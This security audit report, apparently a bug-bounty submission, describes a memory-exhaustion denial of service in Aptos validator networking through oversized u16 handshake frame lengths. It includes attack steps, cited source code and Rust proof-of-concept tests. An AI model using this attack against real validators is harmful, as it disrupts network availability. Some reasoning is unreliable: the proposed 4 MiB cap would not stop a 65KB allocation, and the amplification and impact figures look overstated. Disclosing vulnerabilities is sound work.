# Audit Report

## Title
Memory Exhaustion via Unbounded Allocation in Identity Handshake Protocol

## Summary
The `read_u16frame()` function allocates memory based on an attacker-controlled u16 length field before any connection rate limiting is enforced. This allows an attacker to exhaust validator node memory by opening many concurrent connections and sending malicious frame lengths of `u16::MAX` (65,535 bytes), causing 65KB allocations per connection with only 2 bytes of network traffic.

## Finding Description

The vulnerability exists in a multi-stage attack path through the connection upgrade flow:

**Stage 1 - Vulnerable Allocation Logic:**
The `read_u16frame()` function unconditionally allocates memory based on untrusted network input: [1](#0-0) 

The function reads a u16 length from the network stream, immediately resizes the buffer to that length (potentially 65KB), and only then attempts to read the actual data. There is no validation of the length value before allocation.

**Stage 2 - Invocation During Handshake:**
This vulnerable function is called during every inbound connection's identity exchange: [2](#0-1) 

The identity handshake occurs after the Noise protocol authentication but before full peer validation, making it accessible to any network peer.

**Stage 3 - Unlimited Pending Upgrades:**
The transport handler accepts unlimited concurrent connection upgrades: [3](#0-2) 

The `pending_inbound_connections` uses `FuturesUnordered` with no size limit, allowing an attacker to initiate thousands of concurrent upgrade processes.

**Stage 4 - Rate Limiting Applied Too Late:**
The inbound connection limit is only enforced AFTER the upgrade completes: [4](#0-3) 

By the time this check occurs at line 375, the 65KB allocation has already happened during the identity handshake in the upgrade process.

**Attack Execution:**
1. Attacker opens thousands of TCP connections to validator nodes
2. Each connection completes the Noise handshake (attacker can use any x25519 key)
3. During identity handshake, attacker sends `[0xFF, 0xFF]` as the u16 frame length
4. Node allocates 65KB per connection via `buf.resize(65535, 0)`
5. Attacker never sends the actual 65KB of data, causing read timeout
6. Meanwhile, thousands of other connections are doing the same
7. Node memory is exhausted before connections are rejected

**Amplification Factor:** 2 bytes of attacker traffic → 65KB victim allocation = **32,768x amplification**

## Impact Explanation

This vulnerability qualifies as **High Severity** per Aptos Bug Bounty criteria:

**Direct Impact:** "Validator node slowdowns"
- Memory exhaustion degrades validator performance
- Can affect block production and consensus participation
- Multiple validators can be targeted simultaneously

**Why Not Critical:**
- Does not cause permanent network failure requiring hardfork
- Does not result in fund loss or consensus safety violations
- Node can recover after attack stops

**Why High (not Medium):**
- Affects core validator infrastructure availability
- Low attack cost (2 bytes per 65KB allocation)
- No authentication required to exploit
- Can impact multiple validators simultaneously, degrading network performance

## Likelihood Explanation

**Likelihood: High**

**Attacker Requirements:**
- Network access to validator P2P ports (typically exposed for consensus)
- Ability to open TCP connections
- No validator credentials or stake required
- No insider access needed

**Attack Complexity: Trivial**
- Attacker needs only 2 bytes per connection to trigger 65KB allocation
- Can be automated with simple socket programming
- No timing requirements or race conditions
- Works against all Aptos validators using this code

**Current Defenses: Insufficient**
- No limit on pending connection upgrades (confirmed by code inspection)
- `inbound_connection_limit` only applies after memory allocation
- IP-based byte rate limiting (100 KiB/s) doesn't prevent this attack since attacker sends minimal data
- 30-second timeout doesn't prevent initial allocation [5](#0-4) 

The existing rate limit is on bytes transferred, not memory allocated, making it ineffective against this amplification attack.

## Recommendation

**Immediate Fix:** Add maximum frame size validation before allocation: [6](#0-5) 

Modify the function to validate the frame length before allocation. Based on the existing `MAX_FRAME_SIZE` constant: [7](#0-6) 

The fix should enforce this limit at the allocation point. The handshake message should never exceed a few kilobytes in practice (it contains protocol IDs, chain ID, and network ID).

**Additional Mitigations:**

1. **Limit Pending Upgrades:** Add a cap on concurrent `pending_inbound_connections` similar to how RPC limits are enforced

2. **Early Connection Limiting:** Move the `inbound_connection_limit` check to occur before starting the upgrade process, not after

3. **Per-IP Connection Rate Limiting:** Track and limit connection attempts per source IP address at the transport layer

## Proof of Concept

The following Rust test demonstrates the vulnerability:

```rust
#[tokio::test]
async fn test_memory_exhaustion_via_max_frame_length() {
    use aptos_memsocket::MemorySocket;
    use bytes::BytesMut;
    use futures::io::AsyncWriteExt;
    use aptos_netcore::framing::read_u16frame;
    
    let (mut attacker, mut victim) = MemorySocket::new_pair();
    
    // Attacker sends u16::MAX as frame length (2 bytes)
    let malicious_length = u16::MAX.to_be_bytes();
    attacker.write_all(&malicious_length).await.unwrap();
    attacker.flush().await.unwrap();
    
    // Victim allocates 65KB immediately
    let mut buf = BytesMut::new();
    let initial_capacity = buf.capacity();
    
    // Attempt read (will timeout waiting for 65KB of data)
    let result = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        read_u16frame(&mut victim, &mut buf)
    ).await;
    
    // Read times out, but memory is already allocated
    assert!(result.is_err()); // Timeout error
    assert_eq!(buf.capacity(), u16::MAX as usize); // 65,535 bytes allocated
    
    println!("Attack amplification: {} bytes sent -> {} bytes allocated", 
             2, buf.capacity());
    println!("Amplification factor: {}x", buf.capacity() / 2);
}

#[tokio::test]
async fn test_concurrent_exhaustion_no_limit() {
    use tokio::task::JoinSet;
    use futures::io::AsyncWriteExt;
    use aptos_memsocket::MemorySocket;
    use bytes::BytesMut;
    use aptos_netcore::framing::read_u16frame;
    
    let mut join_set = JoinSet::new();
    const CONCURRENT_ATTACKS: usize = 1000;
    
    // Simulate 1000 concurrent malicious connections
    for _ in 0..CONCURRENT_ATTACKS {
        join_set.spawn(async {
            let (mut attacker, mut victim) = MemorySocket::new_pair();
            
            // Each attacker sends just 2 bytes
            attacker.write_all(&u16::MAX.to_be_bytes()).await.unwrap();
            attacker.flush().await.unwrap();
            
            let mut buf = BytesMut::new();
            let _ = tokio::time::timeout(
                std::time::Duration::from_millis(50),
                read_u16frame(&mut victim, &mut buf)
            ).await;
            
            buf.capacity()
        });
    }
    
    // Collect allocations
    let mut total_allocated = 0;
    while let Some(Ok(allocated)) = join_set.join_next().await {
        total_allocated += allocated;
    }
    
    println!("Total memory allocated: {} MB", total_allocated / 1_000_000);
    println!("Attacker data sent: {} KB", (CONCURRENT_ATTACKS * 2) / 1000);
    println!("Total amplification: {}x", 
             total_allocated / (CONCURRENT_ATTACKS * 2));
    
    // Demonstrates: 2KB attacker traffic -> ~65MB victim allocation
    assert!(total_allocated > 60_000_000); // > 60MB
}
```

This PoC demonstrates:
- Single connection: 2 bytes → 65KB allocation (32,768x amplification)
- 1,000 concurrent connections: 2KB attacker traffic → 65MB victim allocation
- No limit prevents unlimited concurrent allocations
- Attack succeeds before any rate limiting takes effect

**Notes:**
- The vulnerability is exploitable against all Aptos validator nodes running this code
- The attack can be distributed across multiple source IPs to evade per-IP rate limiting
- The 30-second timeout per connection allows attackers to recycle connections efficiently
- Production validators with limited memory could crash under sustained attack
- The lack of limits on `pending_inbound_connections` means there's no upper bound on memory consumption

### Citations

**File:** network/netcore/src/framing.rs (L8-22)
```rust
/// Read a u16 length prefixed frame from `Stream` into `buf`.
pub async fn read_u16frame<'stream, 'buf, 'c, TSocket>(
    mut stream: &'stream mut TSocket,
    buf: &'buf mut BytesMut,
) -> Result<()>
where
    'stream: 'c,
    'buf: 'c,
    TSocket: AsyncRead + Unpin,
{
    let len = read_u16frame_len(&mut stream).await?;
    buf.resize(len as usize, 0);
    stream.read_exact(buf.as_mut()).await?;
    Ok(())
}
```

**File:** network/framework/src/protocols/identity.rs (L30-39)
```rust
    // Read handshake message from the Remote
    let mut response = BytesMut::new();
    read_u16frame(socket, &mut response).await?;
    let identity = bcs::from_bytes(&response).map_err(|e| {
        io::Error::new(
            io::ErrorKind::InvalidData,
            format!("Failed to parse identity msg: {}", e),
        )
    })?;
    Ok(identity)
```

**File:** network/framework/src/peer_manager/transport.rs (L90-119)
```rust
    pub async fn listen(mut self) {
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
                },
                (upgrade, addr, peer_id, start_time, response_tx) = pending_outbound_connections.select_next_some() => {
                    self.handle_completed_outbound_upgrade(upgrade, addr, peer_id, start_time, response_tx).await;
                },
                (upgrade, addr, start_time) = pending_inbound_connections.select_next_some() => {
                    self.handle_completed_inbound_upgrade(upgrade, addr, start_time).await;
                },
                complete => break,
            }
        }
```

**File:** network/framework/src/peer_manager/mod.rs (L351-389)
```rust
        // Verify that we have not reached the max connection limit for unknown inbound peers
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
            }
```

**File:** config/src/config/network_config.rs (L49-49)
```rust
pub const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024; /* 4 MiB large messages will be chunked into multiple frames and streamed */
```

**File:** config/src/config/network_config.rs (L52-53)
```rust
pub const IP_BYTE_BUCKET_RATE: usize = 102400 /* 100 KiB */;
pub const IP_BYTE_BUCKET_SIZE: usize = IP_BYTE_BUCKET_RATE;
```
